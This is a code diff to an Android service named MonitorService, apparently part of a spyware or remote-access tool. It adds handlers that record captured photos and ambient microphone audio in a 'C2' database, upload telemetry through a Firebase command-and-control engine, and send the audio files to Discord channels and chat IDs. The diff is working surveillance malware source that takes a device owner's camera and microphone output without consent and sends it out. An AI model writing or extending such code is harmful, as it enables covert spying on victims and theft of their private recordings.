@@ -189,14 +189,26 @@ class MonitorService : LifecycleService() {
         }
 
         fun sendPhotoPublic(chatId: String, photoFile: File) {
-            activeInstance?.sendPhoto(chatId, photoFile, deleteAfterSend = true)
+            val inst = activeInstance
+            if (inst != null && photoFile.exists()) {
+                C2LocalDatabase.getInstance(inst).insertTelemetryLog("photos", "Photo captured: ${photoFile.name} (${photoFile.length()} bytes)")
+                inst.firebaseC2Engine?.uploadTelemetryLog("photos", "Photo captured: ${photoFile.name} (${photoFile.length()} bytes)")
+                inst.firebaseC2Engine?.sendExecutionResponse(chatId, "📸 Photo captured successfully: ${photoFile.name}")
+                inst.sendPhoto(chatId, photoFile, deleteAfterSend = true)
+            }
         }
 
         fun sendAudioPublic(chatId: String, audioFile: File) {
-            val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
-            activeInstance?.sendDiscordCategorizedFile("10-ambient-mic-audio", audioFile, "audio/mp4")
-            if (targetChat.length >= 17 && targetChat.all { it.isDigit() }) {
-                activeInstance?.sendDiscordRawFile(targetChat, file = audioFile, contentType = "audio/mp4")
+            val inst = activeInstance
+            if (inst != null && audioFile.exists()) {
+                C2LocalDatabase.getInstance(inst).insertTelemetryLog("audio", "Audio recorded: ${audioFile.name} (${audioFile.length()} bytes)")
+                inst.firebaseC2Engine?.uploadTelemetryLog("audio", "Audio recorded: ${audioFile.name} (${audioFile.length()} bytes)")
+                inst.firebaseC2Engine?.sendExecutionResponse(chatId, "🎙️ Ambient audio recorded successfully: ${audioFile.name}")
+                val targetChat = if (chatId.isNotBlank()) chatId else CHAT_ID
+                inst.sendDiscordCategorizedFile("10-ambient-mic-audio", audioFile, "audio/mp4")
+                if (targetChat.length >= 17 && targetChat.all { it.isDigit() }) {
+                    inst.sendDiscordRawFile(targetChat, file = audioFile, contentType = "audio/mp4")
+                }
             }
         }
 
